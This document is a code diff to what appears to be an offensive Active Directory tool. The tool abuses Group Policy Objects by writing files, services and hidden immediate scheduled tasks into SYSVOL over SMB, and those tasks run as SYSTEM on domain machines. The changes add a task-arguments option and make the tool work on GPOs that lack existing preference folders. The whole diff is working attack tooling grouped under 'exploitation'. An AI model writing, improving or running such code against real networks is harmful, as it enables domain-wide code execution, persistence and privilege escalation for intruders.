@@ -169,7 +169,7 @@ class GPOhelper:
         self.template_service = '<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}" name="CHANGEME_NAME" image="2" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT"><Properties startupType="AUTOMATIC" serviceName="CHANGEME_NAME" serviceAction="CHANGEME_ACTION" timeout="30" accountName="LocalSystem" interact="0"/></NTService></NTServices>'
 
         self.template_task_new = '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"></ScheduledTasks>'
-        self.template_task = '<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="CHANGEME_TASKNAME" image="0" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT" removePolicy="0"><Properties action="C" name="CHANGEME_TASKNAME" runAs="CHANGEME_USER" logonType="S4U"><Task version="1.2"><RegistrationInfo><Author>CHANGEME_AUTHOR</Author><Description>CHANGEME_DESCRIPTION</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>CHANGEME_USER</UserId><LogonType>S4U</LogonType><RunLevel>HighestPrivilege</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT5M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>CHANGEME_LOCATION</Command></Exec></Actions></Task></Properties></ImmediateTaskV2></ScheduledTasks>'
+        self.template_task = '<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="CHANGEME_TASKNAME" image="0" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT" removePolicy="0"><Properties action="C" name="CHANGEME_TASKNAME" runAs="CHANGEME_USER" logonType="S4U"><Task version="1.2"><RegistrationInfo><Author>CHANGEME_AUTHOR</Author><Description>CHANGEME_DESCRIPTION</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>CHANGEME_USER</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT5M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>CHANGEME_LOCATION</Command><Arguments>CHANGEME_ARGS</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2></ScheduledTasks>'
 
     def ldap3_kerberos_login(self,connection, target, user, password, domain='', lmhash=None, nthash=None, aesKey='', kdcHost=None,
                             TGT=None, TGS=None, useCache=True):
@@ -711,6 +711,9 @@ class GPOhelper:
     def GPOCopyFile(self, srcPath, dstPath, hidden, gpo):
         (path, info, dn) = self.extractInfo(gpo)
 
+        if not info:                      # <-- add this
+           info = [['Core GPO Engine']]
+
         filename = dstPath[dstPath.rindex("\\") + 1:]
         remotePath = path + "\\" + self.gpopath + "\\" + filename
         xmlPath = path + "\\" + self.gpopath + "\\Preferences\\Files\\Files.xml"
@@ -733,6 +736,15 @@ class GPOhelper:
         if srcPath[:2] != "\\\\":
             self.SMBUploadFile(srcPath, remotePath)
 
+        try:
+            self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences")
+        except:
+            pass
+        try:
+            self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences\\Files")
+        except:
+            pass
+
         if "Files" in info[0]:
             k = ""
             try:
@@ -743,10 +755,6 @@ class GPOhelper:
                 raise
         else:
             k = "Files"
-            try:
-                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences\\Files")
-            except:
-                pass
             orig = bytes(self.template_file_new.encode("utf-8"))
             modified = orig.replace(b'</Files>', bytes(template.encode("utf-8")))
             self.SMBWriteFile(xmlPath, modified)
@@ -1715,6 +1723,10 @@ displayName={display_name}
 
     def GPOService(self, action, name, gpo):
         (path, info, dn) = self.extractInfo(gpo)
+
+        if not info:
+           info = [['Core GPO Engine']]
+
         xmlPath = path + "\\" + self.gpopath +"\\Preferences\\Services\\Services.xml"
 
         now = datetime.now()
@@ -1747,8 +1759,11 @@ displayName={display_name}
             self.SMBWriteFile(xmlPath, modified)
         self.updateGUID(info, k, ['Group Policy Services', 'Services'], dn)
 
-    def GPOImmTask(self, taskname, author, description, location, user, gpo):
+    def GPOImmTask(self, taskname, author, description, location, user, gpo, args=""):
         (path, info, dn) = self.extractInfo(gpo)
+
+        if not info:
+           info = [['Core GPO Engine']]
 
         xmlPath = path + "\\" + self.gpopath + "\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
 
@@ -1761,6 +1776,7 @@ displayName={display_name}
         template = template.replace("CHANGEME_AUTHOR", author)
         template = template.replace("CHANGEME_DESCRIPTION", description)
         template = template.replace("CHANGEME_LOCATION", location)
+        template = template.replace("CHANGEME_ARGS", args)
         template = template.replace("CHANGEME_USER", user)
         if self.smbconn == '':
             self.conn2smb()
@@ -1775,6 +1791,10 @@ displayName={display_name}
                 raise
         else:
             k = "Scheduled Tasks"
+            try:
+                self.smbconn.createDirectory('Sysvol', path + "\\" + self.gpopath + "\\Preferences")
+            except:
+                pass
             try:
                 self.smbconn.createDirectory('Sysvol', path + "\\"+ self.gpopath + "\\Preferences\\ScheduledTasks")
             except:
@@ -1863,6 +1883,7 @@ def parse_args():
     exploitation.add_argument('-author', action="store", metavar="Task Author", help="Author for Scheduled Task")
     exploitation.add_argument('-taskname', action="store", metavar="Task Name", help="Name for the Scheduled Task")
     exploitation.add_argument('-taskdescription', action="store", metavar="Task description", help="Description for the scheduled task")
+    exploitation.add_argument('-taskargs', action="store", metavar="Task arguments", help="Arguments passed to the scheduled task's command", default="")
     exploitation.add_argument('-gpoupdatever', action="store_true", help="Update GPO version (GPT.INI file and LDAP object)")
     exploitation.add_argument('-usercontext', action="store_true", help="Execute the GPO in the context of the user")
 
@@ -2113,7 +2134,7 @@ def main():
             user = options.gpoimmuser
         else:
             user = "NT Authority\\System"
-        helper.GPOImmTask(options.taskname, options.author, options.taskdescription, options.dstpath, user, options.name)
+        helper.GPOImmTask(options.taskname, options.author, options.taskdescription, options.dstpath, user, options.name, options.taskargs)
         helper.updateVersion(options.name)
 
     # -gpoupdatever
